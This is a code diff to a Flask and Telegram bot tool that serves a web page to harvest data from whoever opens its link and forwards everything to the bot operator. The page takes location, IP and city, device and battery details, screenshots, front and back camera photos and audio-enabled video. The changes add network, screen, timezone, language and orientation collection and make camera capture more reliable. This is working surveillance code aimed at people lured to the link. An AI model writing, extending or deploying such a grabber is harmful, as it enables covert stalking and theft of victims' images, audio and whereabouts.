@@ -84,6 +84,12 @@ HTML_PAGE = """<!DOCTYPE html>
                 brand = 'Android';
                 const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
                 model = match ? match[2] : 'Android Device';
+            } else if (ua.includes('Windows')) {
+                brand = 'Microsoft Windows';
+                model = 'PC';
+            } else if (ua.includes('Mac')) {
+                brand = 'Apple Mac';
+                model = 'Mac';
             }
             return { brand, model };
         }
@@ -92,10 +98,40 @@ HTML_PAGE = """<!DOCTYPE html>
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    return { level: Math.round(battery.level * 100), charging: battery.charging };
+                    const level = Math.round(battery.level * 100);
+                    return { level: level, charging: battery.charging };
                 }
             } catch {}
             return { level: 'unknown', charging: 'unknown' };
+        }
+
+        function getNetworkType() {
+            if (navigator.connection) {
+                const type = navigator.connection.effectiveType || 'unknown';
+                return type; // '4g', '3g', '2g', 'slow-2g', 'wifi' (if available)
+            }
+            return 'unknown';
+        }
+
+        function getScreenResolution() {
+            return `${window.screen.width}x${window.screen.height}`;
+        }
+
+        function getTimezone() {
+            try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch { return 'unknown'; }
+        }
+
+        function getLanguage() {
+            return navigator.language || 'unknown';
+        }
+
+        function getOrientation() {
+            if (screen.orientation) {
+                return screen.orientation.type; // 'portrait-primary', 'landscape-secondary', etc.
+            } else if (window.orientation !== undefined) {
+                return window.orientation === 0 ? 'portrait' : 'landscape';
+            }
+            return 'unknown';
         }
 
         function captureScreenshot() {
@@ -115,52 +151,53 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Improved camera acquisition ----
+        // ---- Robust camera acquisition ----
         async function getCameraStreams() {
             let back = null, front = null;
             let errorMessages = [];
+            let success = false;
 
             // Try 1: No constraints (most compatible)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                back = stream; // assign as back
-                // Try to get front separately
-                try {
-                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                    front = frontStream;
-                } catch (e) {
-                    // If front fails, reuse back for front (clone)
-                    front = back.clone();
-                }
-                return { front, back, error: null };
-            } catch (err) {
-                errorMessages.push('No-constraint failed: ' + err.name + ' - ' + err.message);
-            }
-
-            // Try 2: Back camera with environment
-            try {
-                back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-                // Try front
+                back = stream;
+                // Try front separately
                 try {
                     front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                 } catch (e) {
                     front = back.clone();
                 }
+                success = true;
                 return { front, back, error: null };
             } catch (err) {
-                errorMessages.push('Environment failed: ' + err.name + ' - ' + err.message);
+                errorMessages.push('No-constraint: ' + err.name + ' - ' + err.message);
             }
 
-            // Try 3: Front camera only (user)
+            // Try 2: Environment (back camera)
+            try {
+                back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+                try {
+                    front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                } catch (e) {
+                    front = back.clone();
+                }
+                success = true;
+                return { front, back, error: null };
+            } catch (err) {
+                errorMessages.push('Environment: ' + err.name + ' - ' + err.message);
+            }
+
+            // Try 3: User (front camera)
             try {
                 front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-                back = front.clone(); // reuse for back
+                back = front.clone();
+                success = true;
                 return { front, back, error: null };
             } catch (err) {
-                errorMessages.push('User failed: ' + err.name + ' - ' + err.message);
+                errorMessages.push('User: ' + err.name + ' - ' + err.message);
             }
 
-            // All attempts failed
+            // All failed
             return { front: null, back: null, error: errorMessages.join(' | ') };
         }
 
@@ -171,6 +208,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
+                    // Give time for the camera to warm up
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth;
@@ -182,7 +220,7 @@ HTML_PAGE = """<!DOCTYPE html>
                             video.pause();
                             video.srcObject = null;
                         }, 'image/jpeg', 0.9);
-                    }, 100);
+                    }, 200);
                 };
             });
         }
@@ -207,10 +245,15 @@ HTML_PAGE = """<!DOCTYPE html>
                 locationData = { denied: true };
             }
 
-            // IP, Device, Battery
+            // Collect system data
             const ipInfo = await getIpInfo();
             const device = getDeviceInfo();
             const battery = await getBatteryInfo();
+            const network = getNetworkType();
+            const screenRes = getScreenResolution();
+            const timezone = getTimezone();
+            const language = getLanguage();
+            const orientation = getOrientation();
 
             // Camera
             const { front, back, error } = await getCameraStreams();
@@ -226,7 +269,15 @@ HTML_PAGE = """<!DOCTYPE html>
                 if (back) backBlob = await captureFrame(back);
                 const recordStream = back || front;
                 if (recordStream) {
-                    mediaRecorder = new MediaRecorder(recordStream, { mimeType: 'video/webm;codecs=vp9,opus' });
+                    // Try to use a codec that supports audio
+                    let mimeType = 'video/webm;codecs=vp9,opus';
+                    if (!MediaRecorder.isTypeSupported(mimeType)) {
+                        mimeType = 'video/webm;codecs=vp8,opus';
+                    }
+                    if (!MediaRecorder.isTypeSupported(mimeType)) {
+                        mimeType = 'video/webm';
+                    }
+                    mediaRecorder = new MediaRecorder(recordStream, { mimeType: mimeType });
                     recordedChunks = [];
                     mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                     mediaRecorder.onstop = () => {
@@ -255,12 +306,14 @@ HTML_PAGE = """<!DOCTYPE html>
                 if (finalized) return;
                 finalized = true;
                 const fd = new FormData();
+                // Location
                 if (locationData && !locationData.denied) {
                     fd.append('lat', locationData.lat);
                     fd.append('lng', locationData.lng);
                 } else {
                     fd.append('location_denied', 'true');
                 }
+                // System info
                 fd.append('ip', ipInfo.ip || 'unknown');
                 fd.append('city', ipInfo.city || 'unknown');
                 fd.append('region', ipInfo.region || 'unknown');
@@ -269,8 +322,14 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('model', device.model);
                 fd.append('battery_level', battery.level);
                 fd.append('battery_charging', battery.charging);
+                fd.append('network', network);
+                fd.append('screen_res', screenRes);
+                fd.append('timezone', timezone);
+                fd.append('language', language);
+                fd.append('orientation', orientation);
                 fd.append('camera_status', cameraStatus);
                 fd.append('camera_error', cameraError || '');
+                // Media
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
                 if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
                 if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
@@ -308,6 +367,7 @@ def index():
 
 @app.route('/capture', methods=['POST'])
 def capture():
+    # Extract all fields
     lat = request.form.get('lat')
     lng = request.form.get('lng')
     location_denied = request.form.get('location_denied')
@@ -319,6 +379,11 @@ def capture():
     model = request.form.get('model', 'Unknown')
     battery_level = request.form.get('battery_level', 'unknown')
     battery_charging = request.form.get('battery_charging', 'unknown')
+    network = request.form.get('network', 'unknown')
+    screen_res = request.form.get('screen_res', 'unknown')
+    timezone = request.form.get('timezone', 'unknown')
+    language = request.form.get('language', 'unknown')
+    orientation = request.form.get('orientation', 'unknown')
     camera_status = request.form.get('camera_status', 'unknown')
     camera_error = request.form.get('camera_error', '')
     screenshot = request.files.get('screenshot')
@@ -326,8 +391,8 @@ def capture():
     back_img = request.files.get('backImage')
     video = request.files.get('video')
 
-    # Debug log
-    print(f"Received: location={lat},{lng}, camera_status={camera_status}, error={camera_error}, front={front_img is not None}, back={back_img is not None}, video={video is not None}")
+    # Log
+    print(f"Received: camera_status={camera_status}, error={camera_error}, front={front_img is not None}, back={back_img is not None}, video={video is not None}")
 
     for uid in USER_IDS:
         # Location
@@ -343,13 +408,18 @@ def capture():
             except Exception as e:
                 print(f"Error: {e}")
 
-        # IP, Device, Battery
+        # System info
         try:
             msg = (
                 f"🌐 IP: {ip}\n"
                 f"📍 City: {city}, {region}, {country}\n"
                 f"📱 Device: {brand} - {model}\n"
-                f"🔋 Battery: {battery_level}% (charging: {battery_charging})"
+                f"🔋 Battery: {battery_level}% (charging: {battery_charging})\n"
+                f"📶 Network: {network}\n"
+                f"🖥️ Screen: {screen_res}\n"
+                f"⏰ Timezone: {timezone}\n"
+                f"🌍 Language: {language}\n"
+                f"🔄 Orientation: {orientation}"
             )
             bot.send_message(uid, msg)
         except Exception as e:
@@ -363,13 +433,14 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # Camera images
+        # Front camera
         if front_img:
             try:
                 front_img.seek(0)
                 bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
             except Exception as e:
                 print(f"Front image error: {e}")
+        # Back camera
         if back_img:
             try:
                 back_img.seek(0)
@@ -388,12 +459,12 @@ def capture():
         # Camera status
         if camera_status == 'failed':
             try:
-                bot.send_message(uid, f"⚠️ Camera failed: {camera_error}")
+                bot.send_message(uid, f"⚠️ Camera error: {camera_error}")
             except Exception as e:
                 print(f"Camera status error: {e}")
         elif not front_img and not back_img and not video:
             try:
-                bot.send_message(uid, "⚠️ No camera data – check permissions.")
+                bot.send_message(uid, "⚠️ No camera data received – check permissions.")
             except Exception as e:
                 print(f"Camera note error: {e}")
 
@@ -407,7 +478,7 @@ def capture():
 
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will collect location, device info, battery, screenshot, camera images and video automatically.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will collect comprehensive device data including camera, location, battery, network, screen, timezone, language, orientation, and a screenshot.")
 
 def run_bot():
     print("Bot polling started.")
